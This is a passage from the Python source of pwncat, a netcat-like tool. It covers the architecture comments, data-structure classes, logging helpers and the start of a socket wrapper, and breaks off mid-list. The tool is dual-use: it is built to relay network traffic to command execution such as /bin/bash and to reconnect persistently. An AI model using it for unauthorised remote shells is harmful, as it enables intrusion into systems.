#!/usr/bin/env python3
"""pwncat."""

# Main sections in this file:
# ------------------------------------
#  1. Data structure types
#  2. Library classes
#  3. Network
#  4. Transformer
#  5. IO modules
#  6. PSE Store
#  7. IO Runner / InterruptHandler
#  8. Command & Control
#  9. Command line arguments
# 10. Main entrypoint
#
# How does it work?
# ------------------------------------
# 1. IO (Various input/output modules based on producer/consumer)
# 2. Transformer (transforms data)
# 3. Runner (puts IO consumer/producer into threads)
# 4. Signaling / Interrupts
#
# 1. IO
# ------------------------------------
# IO classes provide basic input/output functionality.
# The producer will constantly gather input (net recv, user input, command output)
# The consumer is a callback applied to this data (net send, output, command execution)
# Each producer/consumer pair will be put into a thread by the Runner instance.
#
# 2. Transformer
# ---------------------------
# Transformer sit on top of a IO callback and can transform the data before it is send
# to the callback. (e.g.: convert LF to CRLF, convert simple text into a HTTP POST request,
# convert a HTTP POST response into text, encrypt/decrypt, etc.)
#
# 3. Runner - The really cool meat:
# ------------------------------------
# The single Runner instance puts it all-together. Each producer/consumer pair (and
# x many Transformer) will be moved into their own Thread.
# Producer and consumer of different instances can be mixed, when adding them to the Runner.
# This allows an Net-1.receive producer, to output it (chat), execute it (command)
# or to send it further via a second Net-2 class (proxy).
#
# A list of Transformer can be added to each consumer/producer pair, allowing further data
# transformation. This means you can simply write a Transformer, which wraps any kind of raw
# data into a Layer-7 protocol and/or unwraps it from it. This allows for easy extension
# of various protocols or other data transformations.
#
# 4. Signaling / Interrupts
# ------------------------------------
# The InterruptHandler instance is distributed across all Threads and and the Runner instance and
# is a way to let other Threads know that a stop signal has been requested.
# Producer/Consumer can implement their own interrupt function so they can be stopped from
# inside (if they do non-blocking stuff) or from outside (if they do blocking stuff).

from __future__ import print_function
from abc import abstractmethod
from abc import ABCMeta

from datetime import datetime
from subprocess import PIPE
from subprocess import Popen
from subprocess import STDOUT

import argparse
import base64
import logging
import os
import re
import select
import signal
import socket
import sys
import threading
import time

# Available since Python 3.3
try:
    import ipaddress
except ImportError:
    pass
# Posix terminal
try:
    import tty
    import termios
except ImportError:
    pass
# Windows
try:
    import msvcrt
except ImportError:
    pass

# Only used with mypy for static source code analysis
if os.environ.get("MYPY_CHECK", False):
    from typing import Optional, Iterator, List, Dict, Any, Callable, Tuple, Union, TypeVar
    from types import CodeType
    from typing_extensions import TypedDict  # pylint: disable=import-error

    SockInst = TypeVar("SockInst", bound="Sock")
    # The following is only to create virtual types for mypy in order to find
    # issues via static type linting.
    SockConn = TypedDict(
        "SockConn",
        {
            "sock": socket.socket,
            "conn": socket.socket,
            "local_host": Optional[str],
            "local_addr": str,
            "local_port": int,
            "remote_host": str,
            "remote_addr": str,
            "remote_port": int,
        },
        total=False,
    )
    SockActive = TypedDict(
        "SockActive",
        {"af": int, "conn": socket.socket, "remote_addr": str, "remote_port": int},
        total=False,
    )

# -------------------------------------------------------------------------------------------------
# GLOBALS
# -------------------------------------------------------------------------------------------------

APPNAME = "pwncat"
APPREPO = "https://github.com/cytopia/pwncat"
VERSION = "0.1.2"

# Default timeout for timeout-based sys.stdin and socket.recv
TIMEOUT_READ_STDIN = 0.05
TIMEOUT_RECV_SOCKET = 0.05
TIMEOUT_RECV_SOCKET_RETRY = 1

# https://docs.python.org/3/library/subprocess.html#popen-constructor
# * 0 means unbuffered (read and write are one system call and can return short)
# * 1 means line buffered (only usable if universal_newlines=True i.e., in a text mode)
# * any other positive value means use a buffer of approximately that size
# * negative bufsize (the default) means the system default of io.DEFAULT_BUFFER_SIZE will be used.
# TODO: should I use 'bufsize=1'?
# TODO: Probably set it to 0: https://stackoverflow.com/a/45664969
POPEN_BUFSIZE = -1

# https://docs.python.org/3/library/socket.html#socket.socket.recv
RECV_BUFSIZE = 8192

# https://docs.python.org/3/library/socket.html#socket.socket.listen
LISTEN_BACKLOG = 0

# #################################################################################################
# #################################################################################################
# ###
# ###   1 / 11   M E T A   C L A S S E S
# ###
# #################################################################################################
# #################################################################################################

# -------------------------------------------------------------------------------------------------
# [1/11 META CLASSES]: (1/2) Abstract
# -------------------------------------------------------------------------------------------------
# Abstract class with Python 2 + Python 3 support: https://stackoverflow.com/questions/35673474
ABC = ABCMeta("ABC", (object,), {"__slots__": ()})


# -------------------------------------------------------------------------------------------------
# [1/11 META CLASSES]: (2/2) Singleton
# -------------------------------------------------------------------------------------------------
class _Singleton(type):
    """A thread-safe metaclass that creates a Singleton base class when called."""

    # https://refactoring.guru/design-patterns/singleton/python/example#example-1
    _instances = {}  # type: Dict[_Singleton, _Singleton]

    _lock = threading.Lock()

    def __call__(cls, *args, **kwargs):
        # type: (_Singleton, Any, Any) -> _Singleton

        # Now, imagine that the program has just been launched. Since there's no
        # Singleton instance yet, multiple threads can simultaneously pass the
        # previous conditional and reach this point almost at the same time. The
        # first of them will acquire lock and will proceed further, while the
        # rest will wait here.
        with cls._lock:
            # The first thread to acquire the lock, reaches this conditional,
            # goes inside and creates the Singleton instance. Once it leaves the
            # lock block, a thread that might have been waiting for the lock
            # release may then enter this section. But since the Singleton field
            # is already initialized, the thread won't create a new object.
            if cls not in cls._instances:
                cls._instances[cls] = super(_Singleton, cls).__call__(*args, **kwargs)
        return cls._instances[cls]


# #################################################################################################
# #################################################################################################
# ###
# ###   2 / 11   D A T A   S T R U C T U R E   T Y P E S
# ###
# #################################################################################################
# #################################################################################################

# -------------------------------------------------------------------------------------------------
# [2/11 DATA STRUCTURE TYPES]: (1/12) DsCallableProducer
# -------------------------------------------------------------------------------------------------
class DsCallableProducer(object):
    """A type-safe data structure for Callable functions."""

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def function(self):
        # type: () -> Callable[..., Iterator[bytes]]
        """`IO.producer`: Callable funtcion function."""
        return self.__function

    @property
    def args(self):
        # type: () -> Any
        """`*args`: optional *args for the callable function."""
        return self.__args

    @property
    def kwargs(self):
        # type: () -> Any
        """`**kargs`: optional *kwargs for the callable function."""
        return self.__kwargs

    # --------------------------------------------------------------------------
    # Contrcutor
    # --------------------------------------------------------------------------
    def __init__(self, function, *args, **kwargs):
        # type: (Callable[..., Iterator[bytes]], Any, Any) -> None
        self.__function = function
        self.__args = args
        self.__kwargs = kwargs


# -------------------------------------------------------------------------------------------------
# [2/11 DATA STRUCTURE TYPES]: (2/12) DsRunnerAction
# -------------------------------------------------------------------------------------------------
class DsRunnerAction(object):
    """A type-safe data structure for Action functions for the Runner class."""

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def producer(self):
        # type: () -> DsCallableProducer
        """`DsCallableProducer`: Data producer function struct with args and kwargs."""
        return self.__producer

    @property
    def consumer(self):
        # type: () -> Callable[[bytes], None]
        """`IO.consumer`: Data consumer function."""
        return self.__consumer

    @property
    def interrupts(self):
        # type: () -> List[Callable[[], None]]
        """`[List[Callable[[], None]]]`: List of interrupt functions for the producer/consumer."""
        return self.__interrupts

    @property
    def transformers(self):
        # type: () -> List[Transform]
        """`[Transform.transformer]`: List of transformer functions applied before consumer."""
        return self.__transformers

    @property
    def daemon_thread(self):
        # type: () -> bool
        """`bool`: Determines if the action will be started in a daemon thread."""
        return self.__daemon_thread

    @property
    def code(self):
        # type: () -> Optional[Union[str, bytes, CodeType]]
        """`ast.AST`: custom Python code which provides a `transform(data, pse) -> str` function."""
        return self.__code

    # --------------------------------------------------------------------------
    # Contrcutor
    # --------------------------------------------------------------------------
    def __init__(
            self,
            producer,  # type: DsCallableProducer
            consumer,  # type: Callable[[bytes], None]
            interrupts,  # type: List[Callable[[], None]]
            transformers,  # type: List[Transform]
            daemon_thread,  # type: bool
            code,  # type: Optional[Union[str, bytes, CodeType]]
    ):
        # type: (...) -> None
        self.__producer = producer
        self.__consumer = consumer
        self.__interrupts = interrupts
        self.__transformers = transformers
        self.__daemon_thread = daemon_thread
        self.__code = code


# -------------------------------------------------------------------------------------------------
# [2/11 DATA STRUCTURE TYPES]: (3/12) DsRunnerTimer
# -------------------------------------------------------------------------------------------------
class DsRunnerTimer(object):
    """A type-safe data structure for Timer functions for the Runner class."""

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def action(self):
        # type: () -> Callable[..., None]
        """`Callable[..., None]`: function to be run periodically."""
        return self.__action

    @property
    def intvl(self):
        # type: () -> int
        """`int`: interval at which to run the action function.."""
        return self.__intvl

    @property
    def args(self):
        # type: () -> Tuple[Any, ...]
        """`*args`: optional *args for the action function."""
        return self.__args

    @property
    def kwargs(self):
        # type: () -> Dict[str, Any]
        """`**kargs`: optional *kwargs for the action function."""
        return self.__kwargs

    @property
    def ssig(self):
        # type: () -> InterruptHandler
        """`InterruptHandler`: InterruptHandler instance."""
        return self.__ssig

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(
            self,
            action,  # type: Callable[..., None]
            ssig,  # type: InterruptHandler
            intvl,  # type: int
            args,  # type: Tuple[Any, ...]
            kwargs,  # type: Dict[str, Any]
    ):
        # type: (...) -> None
        assert type(intvl) is int, type(intvl)
        assert type(kwargs) is dict, type(kwargs)
        self.__action = action
        self.__ssig = ssig
        self.__intvl = intvl
        self.__args = args
        self.__kwargs = kwargs


# -------------------------------------------------------------------------------------------------
# [2/11 DATA STRUCTURE TYPES]: (4/12) DsRunnerRepeater
# -------------------------------------------------------------------------------------------------
class DsRunnerRepeater(object):
    """A type-safe data structure for repeated functions for the Runner class."""

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def action(self):
        # type: () -> Callable[..., None]
        """`Callable[..., None]`: function to be run periodically."""
        return self.__action

    @property
    def repeat(self):
        # type: () -> int
        """`int`: how many times to repeat the action function."""
        return self.__repeat

    @property
    def pause(self):
        # type: () -> float
        """`int`: pause in seconds between repeated action calls."""
        return self.__pause

    @property
    def args(self):
        # type: () -> Tuple[Any, ...]
        """`*args`: optional *args for the action function."""
        return self.__args

    @property
    def kwargs(self):
        # type: () -> Dict[str, Any]
        """`**kargs`: optional *kwargs for the action function."""
        return self.__kwargs

    @property
    def ssig(self):
        # type: () -> InterruptHandler
        """`InterruptHandler`: InterruptHandler instance."""
        return self.__ssig

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(
            self,
            action,  # type: Callable[..., None]
            ssig,  # type: InterruptHandler
            repeat,  # type: int
            pause,  # type: float
            args,  # type: Tuple[Any, ...]
            kwargs,  # type: Dict[str, Any]
    ):
        # type: (...) -> None
        assert type(repeat) is int, type(repeat)
        assert type(pause) is float, type(pause)
        assert type(kwargs) is dict, type(kwargs)
        self.__action = action
        self.__ssig = ssig
        self.__repeat = repeat
        self.__pause = pause
        self.__args = args
        self.__kwargs = kwargs


# -------------------------------------------------------------------------------------------------
# [2/11 DATA STRUCTURE TYPES]: (5/12) DsSock
# -------------------------------------------------------------------------------------------------
class DsSock(object):
    """A type-safe data structure for DsSock options."""

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def bufsize(self):
        # type: () -> int
        """`int`: Receive buffer size."""
        return self.__bufsize

    @property
    def backlog(self):
        # type: () -> int
        """`int`: Listen backlog."""
        return self.__backlog

    @property
    def recv_timeout(self):
        # type: () -> Optional[float]
        """`float` or `None`: Receive timeout to change blocking socket to time-out based."""
        return self.__recv_timeout

    @property
    def nodns(self):
        # type: () -> bool
        """`bool`: Determines if we resolve hostnames or not."""
        return self.__nodns

    @property
    def ipv4(self):
        # type: () -> bool
        """`bool`: Only use IPv4 instead of both, IPv4 and IPv6."""
        return self.__ipv4

    @property
    def ipv6(self):
        # type: () -> bool
        """`bool`: Only use IPv6 instead of both, IPv4 and IPv6."""
        return self.__ipv6

    @property
    def src_addr(self):
        # type: () -> Optional[str]
        """`bool`: Custom source address for connect mode."""
        return self.__src_addr

    @property
    def src_port(self):
        # type: () -> Optional[int]
        """`bool`: Custom source port for connect mode."""
        return self.__src_port

    @property
    def udp(self):
        # type: () -> bool
        """`bool`: Determines if we use TCP or UDP."""
        return self.__udp

    @property
    def udp_sconnect(self):
        # type: () -> bool
        """`bool`: Determines if we use stateful connect for UDP."""
        return self.__udp_sconnect

    @property
    def udp_sconnect_word(self):
        # type: () -> str
        """`str`: What string to send when emulating a stateful UDP connect."""
        return self.__udp_sconnect_word

    @property
    def ip_tos(self):
        # type: () -> Optional[str]
        """`str`: Determines what IP_TOS (Type of Service) value to set for the socket."""
        return self.__ip_tos

    @property
    def info(self):
        # type: () -> Optional[str]
        """`str`: Determines what info to display about the socket connection."""
        return self.__info

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(
            self,
            bufsize,  # type: int
            backlog,  # type: int
            recv_timeout,  # type: Optional[float]
            nodns,  # type: bool
            ipv4,  # type: bool
            ipv6,  # type: bool
            src_addr,  # type: Optional[str]
            src_port,  # type: Optional[int]
            udp,  # type: bool
            udp_sconnect,  # type: bool
            udp_sconnect_word,  # type: str
            ip_tos,  # type: Optional[str]
            info,  # type: str
    ):
        # type: (...) -> None
        assert type(bufsize) is int, type(bufsize)
        assert type(backlog) is int, type(backlog)
        assert type(recv_timeout) is float, type(recv_timeout)
        assert type(nodns) is bool, type(nodns)
        assert type(ipv4) is bool, type(ipv4)
        assert type(ipv6) is bool, type(ipv6)
        assert type(src_addr) is str or src_addr is None, type(src_addr)
        assert type(src_port) is int or src_port is None, type(src_port)
        assert type(udp) is bool, type(udp)
        self.__bufsize = bufsize
        self.__backlog = backlog
        self.__recv_timeout = recv_timeout
        self.__nodns = nodns
        self.__ipv4 = ipv4
        self.__ipv6 = ipv6
        self.__src_addr = src_addr
        self.__src_port = src_port
        self.__udp = udp
        self.__udp_sconnect = udp_sconnect
        self.__udp_sconnect_word = udp_sconnect_word
        self.__ip_tos = ip_tos
        self.__info = info


# -------------------------------------------------------------------------------------------------
# [2/11 DATA STRUCTURE TYPES]: (6/12) DsIONetworkSock
# -------------------------------------------------------------------------------------------------
class DsIONetworkSock(DsSock):
    """A type-safe data structure for IONetwork socket options."""

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def recv_timeout_retry(self):
        # type: () -> int
        """`int`: How many times to retry receiving if stop signal was raised."""
        return self.__recv_timeout_retry

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(
            self,
            bufsize,  # type: int
            backlog,  # type: int
            recv_timeout,  # type: Optional[float]
            recv_timeout_retry,  # type: int
            nodns,  # type: bool
            ipv4,  # type: bool
            ipv6,  # type: bool
            src_addr,  # type: Optional[str]
            src_port,  # type: Optional[bool]
            udp,  # type: bool
            udp_sconnect,  # type: bool
            udp_sconnect_word,  # type: str
            ip_tos,  # type: Optional[str]
            info,  # type: str
    ):
        # type: (...) -> None
        assert type(recv_timeout_retry) is int, type(recv_timeout_retry)
        self.__recv_timeout_retry = recv_timeout_retry
        super(DsIONetworkSock, self).__init__(
            bufsize,
            backlog,
            recv_timeout,
            nodns,
            ipv4,
            ipv6,
            src_addr,
            src_port,
            udp,
            udp_sconnect,
            udp_sconnect_word,
            ip_tos,
            info,
        )


# -------------------------------------------------------------------------------------------------
# [2/11 DATA STRUCTURE TYPES]: (7/12) DsIONetworkCli
# -------------------------------------------------------------------------------------------------
class DsIONetworkCli(object):
    """A type-safe data structure for IONetwork client options."""

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def reconn(self):
        # type: () -> int
        """`int`: If connection fails, retry endless (if negative) or x many times."""
        return self.__reconn

    @reconn.setter
    def reconn(self, value):
        # type: (int) -> None
        assert type(value) is int, type(value)
        self.__reconn = value

    @property
    def reconn_wait(self):
        # type: () -> float
        """`float`: Wait time between re-connections in seconds."""
        return self.__reconn_wait

    @reconn_wait.setter
    def reconn_wait(self, value):
        # type: (float) -> None
        assert type(value) is float, type(value)
        self.__reconn_wait = value

    @property
    def reconn_robin(self):
        # type: () -> List[int]
        """`[int]`: List of alternating re-connection ports."""
        return self.__reconn_robin

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self, reconn, reconn_wait, reconn_robin):
        # type: (int, float, List[int]) -> None
        assert type(reconn) is int, type(reconn)
        assert type(reconn_wait) is float, type(reconn_wait)
        assert type(reconn_robin) is list, type(reconn_robin)
        for i in reconn_robin:
            assert type(i) is int, type(i)
        self.__reconn = reconn
        self.__reconn_wait = reconn_wait
        self.__reconn_robin = reconn_robin


# -------------------------------------------------------------------------------------------------
# [2/11 DATA STRUCTURE TYPES]: (8/12) DsIONetworkSrv
# -------------------------------------------------------------------------------------------------
class DsIONetworkSrv(object):
    """A type-safe data structure for IONetwork server options."""

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def keep_open(self):
        # type: () -> bool
        """`bool`: Accept new clients if one has disconnected."""
        return bool(self.__keep_open)

    @keep_open.setter
    def keep_open(self, value):
        # type: (bool) -> None
        """Change keep_open value."""
        assert type(value) is bool, type(value)
        self.__keep_open = value

    @property
    def rebind(self):
        # type: () -> int
        """`int`: If binding fails, retry endless (if negative) or x many times."""
        return self.__rebind

    @rebind.setter
    def rebind(self, value):
        # type: (int) -> None
        assert type(value) is int, type(value)
        self.__rebind = value

    @property
    def rebind_wait(self):
        # type: () -> float
        """`float`: Wait time between rebinds in seconds."""
        return self.__rebind_wait

    @property
    def rebind_robin(self):
        # type: () -> List[int]
        """`[int]`: List of alternating rebind ports."""
        return self.__rebind_robin

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self, keep_open, rebind, rebind_wait, rebind_robin):
        # type: (bool, int, float, List[int]) -> None
        assert type(keep_open) is bool, type(keep_open)
        assert type(rebind) is int, type(rebind)
        assert type(rebind_wait) is float, type(rebind_wait)
        assert type(rebind_robin) is list, type(rebind_robin)
        for i in rebind_robin:
            assert type(i) is int, type(i)
        self.keep_open = keep_open
        self.__rebind = rebind
        self.__rebind_wait = rebind_wait
        self.__rebind_robin = rebind_robin


# -------------------------------------------------------------------------------------------------
# [2/11 DATA STRUCTURE TYPES]: (9/12) DsTransformLinefeed
# -------------------------------------------------------------------------------------------------
class DsTransformLinefeed(object):
    """A type-safe data structure for DsTransformLinefeed options."""

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def crlf(self):
        # type: () -> Optional[str]
        """`bool`: Converts line endings to LF, CRLF or CR and noop on `None`."""
        return self.__crlf

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self, crlf):
        # type: (Optional[str]) -> None
        super(DsTransformLinefeed, self).__init__()
        self.__crlf = crlf


# -------------------------------------------------------------------------------------------------
# [2/11 DATA STRUCTURE TYPES]: (10/12) DsTransformSafeword
# -------------------------------------------------------------------------------------------------
class DsTransformSafeword(object):
    """A type-safe data structure for DsTransformSafeword options."""

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def ssig(self):
        # type: () -> InterruptHandler
        """`InterruptHandler`: InterruptHandler instance to trigger a shutdown signal."""
        return self.__ssig

    @property
    def safeword(self):
        # type: () -> str
        """`str`: The safeword to shutdown the instance upon receiving."""
        return self.__safeword

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self, ssig, safeword):
        # type: (InterruptHandler, str) -> None
        super(DsTransformSafeword, self).__init__()
        self.__ssig = ssig
        self.__safeword = safeword


# -------------------------------------------------------------------------------------------------
# [2/11 DATA STRUCTURE TYPES]: (11/12) DsIOStdinStdout
# -------------------------------------------------------------------------------------------------
class DsIOStdinStdout(object):
    """A type-safe data structure for IOStdinStdout options."""

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def enc(self):
        # type: () -> StringEncoder
        """`StringEncoder`: String encoder instance."""
        return self.__enc

    @property
    def input_timeout(self):
        # type: () -> Optional[float]
        """`float`: Input timeout in seconds for non-blocking read or `None` for blocking."""
        return self.__input_timeout

    @property
    def send_on_eof(self):
        # type: () -> bool
        """`float`: Determines if we buffer STDIN until EOF before sending."""
        return self.__send_on_eof

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self, encoder, input_timeout, send_on_eof):
        # type: (StringEncoder, Optional[float], bool) -> None
        super(DsIOStdinStdout, self).__init__()
        self.__enc = encoder
        self.__input_timeout = input_timeout
        self.__send_on_eof = send_on_eof


# -------------------------------------------------------------------------------------------------
# [2/11 DATA STRUCTURE TYPES]: (12/12) DsIOCommand
# -------------------------------------------------------------------------------------------------
class DsIOCommand(object):
    """A type-safe data structure for IOCommand options."""

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def enc(self):
        # type: () -> StringEncoder
        """`StringEncoder`: Instance of StringEncoder."""
        return self.__enc

    @property
    def executable(self):
        # type: () -> str
        """`srt`: Name or path of executable to run (e.g.: `/bin/bash`)."""
        return self.__executable

    @property
    def bufsize(self):
        # type: () -> int
        """`int`: `subprocess.Popen` bufsize.

        https://docs.python.org/3/library/subprocess.html#popen-constructor
        0 means unbuffered (read and write are one system call and can return short)
        1 means line buffered (only usable if universal_newlines=True i.e., in a text mode)
        any other positive value means use a buffer of approximately that size
        negative bufsize (the default) means system default of io.DEFAULT_BUFFER_SIZE will be used.
        """
        return self.__bufsize

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self, enc, executable, bufsize):
        # type: (StringEncoder, str, int) -> None
        self.__enc = enc
        self.__executable = executable
        self.__bufsize = bufsize


# #################################################################################################
# #################################################################################################
# ###
# ###   3 / 11   L I B R A R Y   C L A S S E S
# ###
# #################################################################################################
# #################################################################################################

# -------------------------------------------------------------------------------------------------
# [3/11 LIBRARY CLASSES]: (1/3) TraceLogger
# -------------------------------------------------------------------------------------------------
class TraceLogger(logging.getLoggerClass()):  # type: ignore
    """Extend Python's default logger class with TRACE level logging."""

    LEVEL_NUM = 9
    LEVEL_NAME = "TRACE"

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self, name, level=logging.NOTSET):
        # type: (str, int) -> None
        """Instantiate TraceLogger class.

        Args:
            name (str):  Instance name.
            level (int): Current log level.
        """
        super(TraceLogger, self).__init__(name, level)
        logging.addLevelName(self.LEVEL_NUM, self.LEVEL_NAME)

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def trace(self, msg, *args, **kwargs):
        # type: (str, Any, Any) -> None
        """Set custom log level for TRACE.

        Args:
            msg (str): The log message.
            args (args): *args for trace level log function.
            kwargs (kwargs): kwargs for trace level log function.
        """
        if self.isEnabledFor(self.LEVEL_NUM):
            # Yes, logger takes its '*args' as 'args'.
            self._log(self.LEVEL_NUM, msg, args, **kwargs)


# -------------------------------------------------------------------------------------------------
# [3/11 LIBRARY CLASSES]: (2/3) ColoredLogFormatter
# -------------------------------------------------------------------------------------------------
class ColoredLogFormatter(logging.Formatter):
    """Custom log formatter which adds different details and color support."""

    COLORS = {
        logging.CRITICAL: "\x1b[31;1m",  # bold red
        logging.ERROR: "\x1b[31;21m",  # red
        logging.WARNING: "\x1b[33;21m",  # yellow
        logging.INFO: "\x1b[32;21m",  # green
        logging.DEBUG: "\x1b[30;21m",  # gray
    }
    COLOR_DEF = COLORS[logging.DEBUG]
    COLOR_RST = "\x1b[0m"

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self, color, loglevel):
        # type: (str, int) -> None
        """Instantiate ColoredLogFormatter class.

        Args:
            color (str):  Either be `alway`, `never` or `auto`.
            loglevel (int): Current desired log level.
        """
        super(ColoredLogFormatter, self).__init__()
        self.color = color
        self.loglevel = loglevel
        self.tty = sys.stderr.isatty()

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def format(self, record):
        # type: (logging.LogRecord) -> str
        """Apply custom formatting to log message."""
        log_fmt = self.__get_format()
        log_fmt = self.__colorize(record.levelno, log_fmt)
        formatter = logging.Formatter(log_fmt)
        return formatter.format(record)

    # --------------------------------------------------------------------------
    # Private Functions
    # --------------------------------------------------------------------------
    def __get_format(self):
        # type: () -> str
        """Return format string based on currently applied log level."""
        # In debug logging we add slightly more info to all formats
        if self.loglevel == logging.DEBUG:
            return "%(levelname)s [%(threadName)s]: %(message)s"
        # In lower than debug logging we will add even more info to all log formats
        if self.loglevel < logging.DEBUG:
            return (
                "%(asctime)s %(levelname)s [%(threadName)s] %(lineno)d:%(funcName)s(): %(message)s"
            )
        # By default, we will only add basic info
        return "%(levelname)s: %(message)s"

    def __colorize(self, level, fmt):
        # type: (int, str) -> str
        """Colorize a log message based on its level."""
        if self.color == "never":
            return fmt

        # If stderr is redirected to a file or we're running on windows, do not do colorize
        if self.color == "auto" and (not self.tty or os.name == "nt"):
            return fmt

        return self.COLORS.get(level, self.COLOR_DEF) + fmt + self.COLOR_RST


# -------------------------------------------------------------------------------------------------
# [3/11 LIBRARY CLASSES]: (3/3) StringEncoder
# -------------------------------------------------------------------------------------------------
class StringEncoder(object):
    """Takes care about Python 2/3 string encoding/decoding.

    This allows to parse all string/byte values internally between all
    classes or functions as strings to keep full Python 2/3 compat.
    """

    CODECS = [
        "utf-8",
        "cp437",
        "latin-1",
    ]

    # --------------------------------------------------------------------------
    # Class methods
    # --------------------------------------------------------------------------
    @classmethod
    def rstrip(cls, data, search=None):
        # type: (Union[bytes, str], Optional[str]) -> Union[bytes, str]
        """Implementation of rstring which works on bytes or strings."""
        # We have a bytes object in Python3
        if sys.version_info >= (3, 0) and type(data) is not str:
            # Strip whitespace
            if search is None:
                while True:
                    new = data
                    new = cls.rstrip(new, " ")
                    new = cls.rstrip(new, "\n")
                    new = cls.rstrip(new, "\r")
                    new = cls.rstrip(new, "\t")
                    # Loop until no more changes occur
                    if new == data:
                        return new
            else:
                bsearch = StringEncoder.encode(search)
                while data[-1:] == bsearch:
                    data = data[:-1]
                return data

        # Use native function
        if search is None:
            return data.rstrip()
        return data.rstrip(search)  # type: ignore

    @classmethod
    def encode(cls, data):
        # type: (str) -> bytes
        """Convert string into a byte type for Python3."""
        if sys.version_info >= (3, 0):
            for codec in cls.CODECS:
                # On the last codec, do not catch the exception and let it trigger if it fails
                if codec == cls.CODECS[-1]:
                    return data.encode(codec)
                try:
                    return data.encode(codec)
                except UnicodeEncodeError:
                    pass
        return data  # type: ignore

    @classmethod
    def decode(cls, data):
        # type: (bytes) -> str
        """Convert bytes into a string type for Python3."""
        if sys.version_info >= (3, 0):
            for codec in cls.CODECS:
                # On the last codec, do not catch the exception and let it trigger if it fails
                if codec == cls.CODECS[-1]:
                    return data.decode(codec)
                try:
                    return data.decode(codec)
                except UnicodeDecodeError:
                    pass
        return data  # type: ignore


# #################################################################################################
# #################################################################################################
# ###
# ###   4 / 11   N E T W O R K
# ###
# #################################################################################################
# #################################################################################################

# -------------------------------------------------------------------------------------------------
# [4/11 NETWORK]: (1/1) Sock
# -------------------------------------------------------------------------------------------------
class Sock(_Singleton("SingletonMeta", (object,), {})):  # type: ignore
    """Thread-safe singleton Socket wrapper to emulate a module within the same file."""

    def __init__(self):
        # type: () -> None
        self.__log = logging.getLogger(__name__)

    # --------------------------------------------------------------------------
    # Private constants
    # --------------------------------------------------------------------------
    # For Internet Protocol v4 the value consists of an integer, the least
    # significant 8 bits of which represent the value of the TOS octet in IP
    # packets sent by the socket. RFC 1349 defines the TOS values as follows:
    __IP_TOS = {
        "mincost": 0x02,
        "lowcost": 0x02,
        "reliability": 0x04,
        "throughput": 0x08,
        "lowdelay": 0x10,
    }

    # Human readable address families
    __AF_HUMAN = {
        int(socket.AF_INET): "IPv4",
        int(socket.AF_INET6): "IPv6",
    }

    # Human readable socket types
    __ST_HUMAN = {
        int(socket.SOCK_STREAM): "TCP",
        int(socket.SOCK_DGRAM): "UDP",
    }

    # https://hg.python.org/cpython/file/3.5/Modules/socketmodule.c
    __SOCK_OPTS = {
        "Sock": [
            "SO_DEBUG",
            "SO_ACCEPTCONN",
            "SO_REUSEADDR",
            "SO_EXCLUSIVEADDRUSE",
            "SO_KEEPALIVE",
            "SO_DONTROUTE",
            "SO_BROADCAST",
            "SO_USELOOPBACK",
            "SO_LINGER",
            "SO_OOBINLINE",
            "SO_REUSEPORT",
            "SO_SNDBUF",
            "SO_RCVBUF",
            "SO_SNDLOWAT",
            "SO_RCVLOWAT",
            "SO_SNDTIMEO",
            "SO_RCVTIMEO",
            "SO_ERROR",
            "SO_TYPE",
            "SO_SETFIB",
            "SO_PASSCRED",
            "SO_PEERCRED",
            "LOCAL_PEERCRED",
            "SO_BINDTODEVICE",
            "SO_PRIORITY",
            "SO_MARK",
        ],
        "IPv4": [
            "IP_OPTIONS",
            "IP_HDRINCL",
            "IP_TOS",
            "IP_TTL",
            "IP_RECVOPTS",
            "IP_RECVRETOPTS",
            "IP_RECVDSTADDR",
            "IP_RETOPTS",
            "IP_MULTICAST_IF",
            "IP_MULTICAST_TTL",
            "IP_MULTICAST_LOOP",
            "IP_ADD_MEMBERSHIP",
            "IP_DROP_MEMBERSHIP",
            "IP_DEFAULT_MULTICAST_TTL",
            "IP_DEFAULT_MULTICAST_LOOP",
            "IP_MAX_MEMBERSHIPS",
            "IP_TRANSPARENT",
        ],
        "IPv6": [
            "IPV6_JOIN_GROUP",
            "IPV6_LEAVE_GROUP",
            "IPV6_MULTICAST_HOPS",
            "IPV6_MULTICAST_IF",
            "IPV6_MULTICAST_LOOP",
            "IPV6_UNICAST_HOPS",
            "IPV6_V6ONLY",
            "IPV6_CHECKSUM",
            "IPV6_DONTFRAG",
            "IPV6_DSTOPTS",
            "IPV6_HOPLIMIT",
